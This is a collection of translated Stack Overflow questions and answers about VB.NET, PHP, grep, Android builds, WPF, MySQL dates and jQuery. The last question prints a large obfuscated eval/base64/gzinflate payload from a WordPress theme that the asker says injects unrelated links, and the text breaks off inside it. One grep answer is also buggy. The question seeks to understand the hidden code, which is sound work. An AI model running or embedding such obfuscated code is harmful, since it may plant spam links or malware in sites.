# vb.net - dll 上的 NullReferenceException

> ID：12300501
> 
> 赞同：1
> 
> 时间：2012-09-06T12:48:53.417
> 
> 标签：vb.net

这是我得到错误的代码：

```
Imports ADFactory

Public Class Salary
    Inherits Salary_Datalayer
    Protected _AD As New ADFactory.ADFactory

    Protected Sub Page_Load(...)Handles Me.Load
        _user = "username"
        sDealer = _AD.GetUserCompany(_user) 
```

它指出这`Protected _AD As New ADFactory.ADFactory`是引发异常的行。我已经在网上查看并阅读并更改了几次，宣布“新”，我错过了一些简单的东西吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T16:17:42.140

PatFromCanada 是正确的，我的 ADFactory 是问题所在。我没有正确初始化引用中的连接字符串，因此总是抛出一个空异常，显然，我在我的问题中经常遇到这种情况。感谢PatFromCanada！

# vba - VBA 和 DOM 填写输入框，在一个框架中（代码在这里）

> ID：12300502
> 
> 赞同：0
> 
> 时间：2012-09-06T12:48:58.943
> 
> 标签：vba, dom

我已经引用了 MSHTML 库和 MS Internet 控件设置，我正在尝试使用变量填写表单。主页由 3 个框架组成，“顶部”框架是我的表单所在的位置。如果我直接与框架对话，下面的代码将起作用，框架中的表单称为“NavPage”。Cnum 是我要添加值的元素的名称，然后单击按钮以检索数字

```
Dim HTMLDoc2 As MSHTML.HTMLDocument

Set HTMLDoc2 = Browser.document

HTMLDoc2.forms("NavPage").CNum.Value = "12345" 'will change this to become a variable
HTMLDoc2.forms("Navpage").GetCase.Click 
```

问题是，我如何使用 DOM 引用第一个顶部框架，因为现在它不起作用，并且它向我吐出“对象变量或未设置块变量”。感谢您的任何见解，因为没有太多关于 VB 的信息

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T17:46:46.133

您应该能够使用它来引用第一帧中的文档：

```
Set HTMLDoc2 = Browser.document.frames(0).document 
```

# php - 在 php 中使用联系表单，但 msg 为空

> ID：12300504
> 
> 赞同：-1
> 
> 时间：2012-09-06T12:49:00.763
> 
> 标签：php, email, submit, send, contact

我用这个表格

```
<form action="form.php" method="post">
    <input name="name" type="text" value="اسمك الكريم" onblur="if (this.value=='')this.value='اسمك الكريم'" onclick="value=''" />
    <br />
    <input name="email" type="text" value="البريد الالكتروني" />
    <br />
    <input name="phone" type="text" value="رقم الهاتف" onblur="if (this.value=='')this.value='رقم الهاتف'" onclick="value=''" />
    <br />
    <textarea name="نص الرساله" cols="41" rows="5" placeholder="نص الرساله" wrap=soft></textarea>
    <br />
    <input type="submit" value="ارسال" />
</form> 
```

和php文件

```
<?php
$webmaster_mail = 'sales@elfnoon.com';
$message_subject = 'رسالة من زائر لموقعك';

$in_Body ='';
    foreach($HTTP_POST_VARS as $in_k=>$in_v)
    {
$in_Body .="$in_k = $in_v\n\n";
    }
mail(trim($webmaster_mail), "$message_subject ", "$in_Body","From: " . trim($webmaster_mail));
?> 
```

但是在我得到味精之后是空的

为什么会出现这个问题？？

如果这个问题我使用 htaccess 将 url 从 php 转换为 html

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:53:26.877

`$HTTP_POST_VARS`是旧的并且一些新版本没有激活它，请使用新版本`$_POST`，它只是相同但更短。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:58:02.417

输入的名称必须以字母（ASCII 字符集）开头，后跟字母数字、连字符、下划线、冒号和/或句点。您需要更改文本区域的名称。

# grep - 将 grep 输出与文件中的值匹配

> ID：12300506
> 
> 赞同：0
> 
> 时间：2012-09-06T12:49:03.853
> 
> 标签：grep, aix, pid

我有一个看起来像这样的文件名 clfile.me；

```
44433430,"FALSE"
33095934,"TRUE"
41549968,"TRUE"
37945528,"FALSE"
18284764,"FALSE"
15007934,"FALSE" 
```

编号是 AIX PID。我有一个将 PID 与正在运行的进程匹配的命令。

```
while read p; do
    ps -ef | grep $p | grep 'myproram' | grep -v grep | awk "{ print \$2 }" >> clout.me
done < clfile.me 
```

上面的工作但只显示了与 grep 命令匹配的 PID。我希望能够从原始文件中看到匹配的 PID 和 TRUE 或 FALSE 值。我想我在问如何通过与我的 grep 命令匹配的 PID 过滤原始文件。

有什么想法吗？

谢谢克里斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T15:19:42.143

花了我一段时间，但我有它！

```
cat /dev/null > clout.me
while read p; do
    x=$(awk '{ print $1 }')
    ps -ef | grep x | grep 'myprogram' | grep -v grep | awk "{ print \$2 }" >> clout.me
done < clfile.me

awk 'FNR==NR{A[$1]=1;next} A[$1]' clout.me clfile.me 
```

# playframework - 玩 - 一起使用分页和表格模块

> ID：12300510
> 
> 赞同：0
> 
> 时间：2012-09-06T12:49:13.807
> 
> 标签：playframework, playframework-1.x

我尝试在应用程序中同时使用分页和表格模块，但列表显示不正确。我正在使用 play 1.2.5 。
这是我所做的：-

用户模型：

```
 package models;

import java.util.*;
import javax.persistence.*;

import play.db.jpa.*;

@Entity
public class users extends Model {

    public String email;
    public String password;
    public String username;

    public users(String email, String password, String username) {
        this.email = email;
        this.password = password;
        this.username = username;
    }

} 
```

控制器：

```
 package controllers;
import play.*;
import play.mvc.*;
import java.util.*; 
import play.modules.paginate.ModelPaginator; 
import models.*;`public class Application extends Controller {
    public static void index() {
    ModelPaginator paginator = new ModelPaginator(users.class);
      render(paginator);
    }

}` 
```

风景：

```
 #{paginate.list items : paginator, as 'r'}  
 #{table r/}  
 #{/paginate.list}
```

这样做但效果不佳

那么有什么问题呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T17:20:21.627

您应该能够同时使用两者：首先您分页：您获得整个列表的子列表，然后您使用 table 模块构建漂亮的表格。

# android - 未找到资源 | ANT 重命名应用程序包

> ID：12300521
> 
> 赞同：3
> 
> 时间：2012-09-06T12:49:41.690
> 
> 标签：android, ant, package, android-manifest, rename

经过大量挖掘后，我找到了如何重命名我的应用程序包的解决方案。它工作得很好。

有两种不同的方式。通过 arg 参数的一个：

```
<!-- Replaces the target in tools\ant\build.xml -->
<target name="-package-resources" depends="-crunch">
            <!-- this exec replicates the output of the aapt task in build.xml
                 -package-resources with the addition of a rename-manifest-package option. -->
            <exec executable="${aapt}" failonerror="true">
                <arg value="package" />
                <arg value="-f" />
                <arg value="--auto-add-overlay" />
                <arg value="-M" />
                <arg path="${basedir}/AndroidManifest.xml" />
                <arg value="-S" />
                <arg path="${resource.absolute.dir}" />
                <arg value="-S" />
                <arg path="${basedir}/${android.library.reference.1}/${resource.dir}" />
                <arg value="-A" />
                <arg path="${asset.absolute.dir}" />
                <arg value="-I" />
                <arg path="${android.jar}" />
                <arg value="-F" />
                <arg path="${out.absolute.dir}/${resource.package.file.name}" />
                <arg value="--rename-manifest-package" />
                <arg value="${package.manifest.name}" />
            </exec>
</target> 
```

或直接的（就像原来的 build.xml 一样）：

```
<target name="-package-resources" depends="-crunch">
        <!-- only package resources if *not* a library project -->
        <do-only-if-not-library elseText="Library project: do not package resources..." >
            <aapt executable="${aapt}"
                    command="package"
                    versioncode="${package.manifest.version.code}"
                    versionname="${package.manifest.version.name}"
                    debug="${build.is.packaging.debug}"
                    manifest="${out.manifest.abs.file}"
                    assets="${asset.absolute.dir}"
                    androidjar="${project.target.android.jar}"
                    apkfolder="${out.absolute.dir}"
                    nocrunch="${build.packaging.nocrunch}"
                    resourcefilename="${resource.package.file.name}"
                    resourcefilter="${aapt.resource.filter}"
                    libraryResFolderPathRefid="project.library.res.folder.path"
                    libraryPackagesRefid="project.library.packages"
                    previousBuildType="${build.last.target}"
                    buildType="${build.target}"
                    ignoreAssets="${aapt.ignore.assets}"
                    manifestpackage="${package.manifest.name}">
                <res path="${out.res.absolute.dir}" />
                <res path="${resource.absolute.dir}" />
                <!-- <nocompress /> forces no compression on any files in assets or res/raw -->
                <!-- <nocompress extension="xml" /> forces no compression on specific file extensions in assets and res/raw -->
            </aapt>
        </do-only-if-not-library>
    </target> 
```

现在的问题是我使用的库找不到它的资源（它是一个库，我必须在我的应用程序中包含图形）。所以资源在我的应用程序资源目录中。

如果我尝试从我的包中加载特定的资源（动态），也会发生同样的事情。我使用 ctx.getApplicationPackage() 来获取包名。只要我使用此方法，它就不适用于重命名的版本，但是一旦我尝试使用主应用程序的包名称对其进行硬编码，它就可以工作。

所以我假设参考文献没有更新。假设我有应用程序 1 包 com.package.appfinal 和应用程序 2 包 com.package.apptest。资源仍然可以在 com.package.appfinal 中找到。

我希望有人知道我如何扩展重命名过程以便资源也得到更新？（或他们的参考资料）

提前致谢。

干杯，——迈克

# c# - 为什么我的扩展 RichTextBox 的控件默认为灰色背景？

> ID：12300525
> 
> 赞同：0
> 
> 时间：2012-09-06T12:50:08.830
> 
> 标签：c#, wpf

我正在尝试扩展 RichTextBox，以添加一些额外的功能；但是，我的扩展 RTB 的背景颜色遇到了一个奇怪的问题。这是代码：

RichTextBoxExtended.cs

```
public class RichTextBoxExtended: RichTextBox
{
    // completely empty
} 
```

MyView.xaml

```
<UserControl x:Class="MyNamespace.MyView"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
    <Grid>
        <RichTextBoxExtended />
    </Grid>
</UserControl> 
```

但是，当在 WPF 页面中显示它时，文本框的背景颜色是灰色的，好像它被禁用了（它不是，因为我仍然可以很好地输入它）。作为测试，我`<RichTextBoxExtended />`在 XAML 中替换为`<RichTextBox />`，并且该控件如预期的那样是白色的。

有谁知道什么可能导致这个问题？我可以通过手动将背景颜色设置为白色来轻松解决该问题，但我正在寻找更好的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:12:49.647

我只是将您的代码复制粘贴到测试解决方案中，在主窗口中放置一个框架并将其放入`RichTextBoxExtended`框架内的页面中，但是 RTB 的背景是完全白色的。我认为还有其他原因导致了问题。

# mysql - MySQL 中接受自定义格式日期的方法

> ID：12300529
> 
> 赞同：1
> 
> 时间：2012-09-06T12:50:17.497
> 
> 标签：mysql

MySQL 以日期`YYYY-M-D`为例，如果你这样做：

```
 Select date("2012-9-6"); 
```

它会给：

```
 2012-09-06 
```

但如果你这样做：

```
 Select date("6/9/2012"); 
```

它会给：

```
 null 
```

现在我的问题是：**MySQL**中是否有一种方法可以接受自定义格式的日期？

就像是 ：

```
 select date("6/9/2012","d/m/yyyy"); -- That gives : 2012-09-06 NOT null 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:00:48.637

```
SELECT STR_TO_DATE( '04/31/2004', '%m/%d/%Y' ) ; 
```

这个有效。但是顺序是月/日/年

[手册](http://dev.mysql.com/doc/refman/5.6/en/date-and-time-functions.html#function_date-format)中的更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:51:55.797

使用 date_format() 函数

DATE_FORMAT("2012-9-6",'%m-%d-%Y')

```
mysql> select DATE_FORMAT("2012-9-6",'%m-%d-%Y');
+------------------------------------+
| DATE_FORMAT("2012-9-6",'%m-%d-%Y') |
+------------------------------------+
| 09-06-2012                         |
+------------------------------------+
1 row in set (0.00 sec) 
```

检查这个：

[http://davidwalsh.name/format-date-mysql-date_format](http://davidwalsh.name/format-date-mysql-date_format)

# asp.net - slimScroll.js 和 JQuery 可拖动

> ID：12300530
> 
> 赞同：1
> 
> 时间：2012-09-06T12:50:21.917
> 
> 标签：asp.net, jquery-ui-draggable, jquery-ui-droppable

看一下图片。我创建了 3 个列表。左侧列表中的项目是可拖动的（jquery-ui v1.8.20）。您可以从左侧列表中拖动图片，然后将它们放在中间的列表中。这些列表可以包含许多图片，所以我决定使用 slimScroll.js (v0.5) 添加一个滚动条来滚动这些列表。当我从左侧列表中拖动一个项目时，该项目会消失在中间列表的后面。这与 slimScroll 插件的实现有关。

你们中的任何人都对 slimScroll 和 jquery draggable 有类似的问题吗？你怎么修好它的？

![在此处输入图像描述](../Images/c190614e25bbe5b06f6e988ab193adfd.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:12:31.147

我找到了解决问题的方法

我在`<div id="documentPageDraggableHelper" class="gallery ui-helper-reset"></div>`构成页面的其他 div 之外添加了一个：

```
<div id="mainCategorizerContainer">
    <div id="documentPageRecords" class="documentPagesRecordsArea ui-widget-header">
        <span></span>
    </div>    
    <div id="uncategorizedArea" class="uncategorized-area" >
        <div class="uncategorized-document-pages-list-area">
            <div id="scroll-content-uncategorizedPagesList" >
                <ul id="uncategorizedPagesList" class="gallery ui-helper-reset ui-widget ui-helper-clearfix uncategorizedPages">                      
                </ul>
            </div>
        </div>
    </div>  
    <div id="categorizedArea" class="categorized-area">
        <div class="document-category-list-area">
            <div id="scroll-content-documentCategoryList" >
                <ul id="documentCategoryList" class="ui-helper-reset">                                      
                </ul>
            </div>
        </div>
        <div class="categorized-document-pages-list-area">
        <div id="scroll-content-categorizedDocumentPagesList">
            <ul id="categorizedDocumentPagesList" class="ui-helper-reset" >                       
            </ul>
        </div>
        </div>
    </div>    
    <div id="splitDocumentDialog"><span id="splitDocumentDialogContent"></span></div>
    <div id="documentPageDraggableHelper" class="gallery ui-helper-reset"></div>
</div> 
```

在左侧的可拖动列表中，我添加了一个 appendTo 选项，如下所示

```
uncategorizedPagesListDraggableOptions = {
            cancel: "a.ui-icon", 
            revert: "invalid", 
            containment: "document",
            helper: "clone",
            cursor: "move",
            appendTo: '#documentPageDraggableHelper'
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-03T06:46:34.840

uncategorizedPagesListDraggableOptions = { 取消：“a.ui-icon”，恢复：“无效”，包含：“文档”，助手：“克隆”，光标：“移动”，appendTo：'#documentPageDraggableHelper' }

'helper: "clone"' 和 'appendTo: "body"' 这些属性克隆可拖动元素并附加到 body 以便在页面上自由拖动

# c# - 为什么在禁用运行时检查时 FXCop 会违反 Contract 类？

> ID：12300532
> 
> 赞同：2
> 
> 时间：2012-09-06T12:50:25.553
> 
> 标签：c#, fxcop, code-contracts

一旦您在项目属性中禁用运行时合同检查，就会为合同类引发 FxCop 违规（假设您通过接口实现合同，然后在抽象类中定义合同）。

重新启用运行时合同检查，所有违规行为都消失了。

这是什么原因？

违规行为如：

> CA1811 ObjectInvariant 似乎没有上游调用者

和

> CA1033 使 MyClassContract 密封

这没有意义，因为合同类必须是抽象的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-10T21:51:23.780

好吧，我想我明白你的意思了。你有像凯文这样的类，用一个`AccountContracts`名为而不是`MyClassContract`私有方法命名：`ObjectInvariants``Invariants`

```
[ContractClassFor(typeof(IAccount))]
public abstract class MyClassContract : IAccount
{
    public abstract double Balance { get; }

    void IAccount.Deposit(double amount)
    {
        Contract.Requires(amount >= 0.0d);

        //throw new NotImplementedException();
    }

    bool IAccount.Withdraw(double amount)
    {
        Contract.Requires(amount >= 0.0d);
        Contract.Requires(amount <= Balance);

        throw new NotImplementedException();
    }

    [ContractInvariantMethod]
    private void ObjectInvariants()
    {
        Contract.Invariant(Balance >= 0.0d);
    }
} 
```

FxCopy 和代码分析进行编译后分析。它分析二进制文件，即构建生成的中间语言 (IL)。Code Contracts 有点像进行后编译编织，因为它将代码生成到二进制文件中，该二进制文件不仅派生自您的抽象类`MyClassContract`，而且`ObjectInvariants`至少调用一次该方法。当您“关闭”代码合同时，它不再生成此代码，因此 FxCop 和代码分析看不到任何派生自`MyClassContract`或任何使用`ObjectInvariants`方法的内容，因此会警告您。在 的情况下`MyClassContract`，由于没有任何东西从它派生，它可以被密封（这有助于编译器在某些情况下略微优化）以及使类在将来更易于维护（没有什么*可以*从中派生，因此您可以更自由地更改它-至少这是普遍共识）。

当然，如果您希望代码在没有警告的情况下保持原样，您可以在抑制文件中抑制这些警告。您还可以包含一个编译器常量并包围代码以避免在不使用代码协定时编译，并在启用代码协定时将该常量包含在构建设置中。例如：

```
#if CODE_CONTRACTS
//...
#endif 
```

创建一个新的构建配置通常是最简单的事情，因为您可以拥有一个特定的构建配置，它既可以启用代码契约，又可以`CODE_CONTRACTS`在项目的构建属性中声明。

# php - 递归解码php代码

> ID：12300534
> 
> 赞同：-5
> 
> 时间：2012-09-06T12:50:28.473
> 
> 标签：php, base64, eval, decode

我认为这是一个经典问题，我想解码的 wordpress 主题中有一些编码的 php 代码，该代码负责链接到几个不相关的网站，我想用指向源网站的链接替换它们.

**编辑：**由于反对票，也许我需要解释更多，我尝试用 echo 替换 eval，删除整个代码，在线解码，所有这些都不起作用，因为我总是得到另一个编码字符串，我想要一个解码解决方案字符串迭代直到显示获取 html 代码。

```
eval(gzinflate(base64_decode(str_rot13(strrev('==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